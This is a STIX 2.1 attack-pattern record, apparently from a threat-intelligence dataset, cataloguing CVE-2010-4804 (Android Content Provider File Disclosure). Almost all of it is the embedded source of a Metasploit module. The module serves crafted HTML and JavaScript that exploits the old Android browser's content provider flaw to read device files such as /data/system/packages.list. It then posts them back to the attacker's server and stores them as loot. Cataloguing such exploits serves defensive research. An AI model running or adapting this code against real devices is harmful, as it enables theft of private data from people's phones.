{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a34f34e2-1de6-4525-a1ad-7768cc7c292b",
    "created": "2024-08-14T16:32:51.916525Z",
    "modified": "2024-08-14T16:32:51.916529Z",
    "name": "Android Content Provider File Disclosure",
    "description": " This module exploits a cross-domain issue within the Android web browser to exfiltrate files from a vulnerable device. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/android_htmlfileprovider.rb",
            "external_id": "android_htmlfileprovider.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-4804"
        },
        {
            "source_name": "reference",
            "url": "http://thomascannon.net/blog/2010/11/android-data-stealing-vulnerability/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Android Content Provider File Disclosure',\n      'Description' => %q{\n          This module exploits a cross-domain issue within the Android web browser to\n        exfiltrate files from a vulnerable device.\n      },\n      'Author'      =>\n        [\n          'Thomas Cannon',   # Original discovery, partial disclsoure\n          'jduck'            # Metasploit module\n        ],\n      'License'     => MSF_LICENSE,\n      'Actions'     =>\n        [\n          [ 'WebServer' ]\n        ],\n      'PassiveActions' =>\n        [\n          'WebServer'\n        ],\n      'References' =>\n        [\n          [ 'CVE', '2010-4804' ],\n          [ 'URL', 'http://thomascannon.net/blog/2010/11/android-data-stealing-vulnerability/' ]\n        ],\n      'DefaultAction'  => 'WebServer'))\n\n    register_options(\n      [\n        OptString.new('FILES', [ false, \"The remote file(s) to steal\",\n          '/proc/version,/proc/self/status,/data/system/packages.list' ])\n      ])\n  end\n\n  def on_request_uri(cli, request)\n    print_status(\"Request '#{request.method} #{request.uri}'\")\n    selected_headers = [ 'user-agent', 'origin', 'referer' ]\n    request.headers.each_key { |k|\n      next if not selected_headers.include? k.downcase\n      print_status(\"#{k}: #{request.headers[k]}\")\n    }\n\n    return process_post(cli, request) if request.method == \"POST\"\n\n    # Only GET requests now..\n    if request.uri =~ /\\.html?$/\n      filename = request.uri.split('/').last\n      target_files = datastore['FILES'].split(',').map{ |e|\n        \"'%s'\" % e\n      }.join(',')\n\n      upload_url = get_uri(cli)\n      upload_url << '/' if upload_url[-1,1] != '/'\n      upload_url << 'q'\n\n      html = <<-EOS\n<html>\n<body>\n<script lang=javascript>\nvar target_files = Array(#{target_files});\nvar results = new Array();\nfunction addField(form, name, value) {\n  var hf = document.createElement('input');\n  hf.setAttribute('type', 'hidden');\n  hf.setAttribute('name', name);\n  hf.setAttribute('value', value);\n  form.appendChild(hf);\n}\nfunction uploadFiles(files) {\n  var form = document.createElement('form');\n  form.setAttribute('method', 'POST');\n  form.setAttribute('action', '#{upload_url}');\n  var i = 0;\n  for (var fn in files) {\n    addField(form, 'f'+i, btoa(fn));\n    addField(form, 'd'+i, files[fn]);\n    i += 1;\n  }\n  document.body.appendChild(form);\n  form.submit();\n}\nfor (var fn in target_files) {\n  fn = target_files[fn];\n  xh = new XMLHttpRequest();\n  xh.open('GET', fn, false);\n  xh.onreadystatechange = function() { if (xh.readyState == 4) { results[fn] = btoa(xh.responseText); } }\n  xh.send();\n}\nuploadFiles(results);\n</script>\n</body>\n</html>\nEOS\n\n      print_status(\"Sending payload HTML ...\")\n      send_response_html(cli, html,\n        {\n          'Cache-Control' => 'public',\n          'Content-Description' => 'File Transfer',\n          'Content-Disposition' => \"attachment; filename=#{filename}\",\n          'Content-Transfer-Encoding' => 'binary',\n          'Content-Type' => 'text/html'\n        })\n\n\n    else\n      payload_fn = Rex::Text.rand_text_alphanumeric(4+rand(8))\n\n      html = <<-EOS\n<html>\n<body>\n<script lang=javascript>\nsetTimeout(\"document.location = 'content://com.android.htmlfileprovider/sdcard/download/#{payload_fn}.html';\", 5000);\nsetTimeout(\"document.location = '#{payload_fn}.html';\", 500);\n</script>\n</body>\n</html>\nEOS\n\n      print_status(\"Sending initial HTML ...\")\n      send_response_html(cli, html)\n\n    end\n  end\n\n  def process_post(cli, request)\n\n    results = {}\n\n    if request and request.body\n      request.body.split('&').each { |var|\n        parts = var.split('=', 2)\n        if parts.length != 2\n          print_error(\"Weird, we got a var that doesn't contain an equals: #{parts.inspect}\")\n        else\n          fln,fld = parts\n          fld = Rex::Text.uri_decode(fld).unpack('m').first\n          start = fln.slice!(0,1)\n          if start == \"f\"\n            results[fln] ||= {}\n            results[fln][:filename] = fld\n          elsif start == \"d\"\n            results[fln] ||= {}\n            results[fln][:data] = fld\n          end\n        end\n      }\n    end\n\n    results.each_key { |k|\n      e = results[k]\n      fn = e[:filename]\n      data = e[:data]\n      print_good(\"#{fn.inspect} contains #{data.inspect}\")\n\n      fn.gsub!(/[\\/\\\\]/, '.')\n      fn.gsub!(/^\\./, '')\n      store_loot('android.fs.'+fn, 'application/octet-stream', cli.peerhost, data, fn)\n    }\n\n    send_response_html(cli, \"thx\")\n  end\n\n  def run\n    exploit()\n  end\nend\n"
}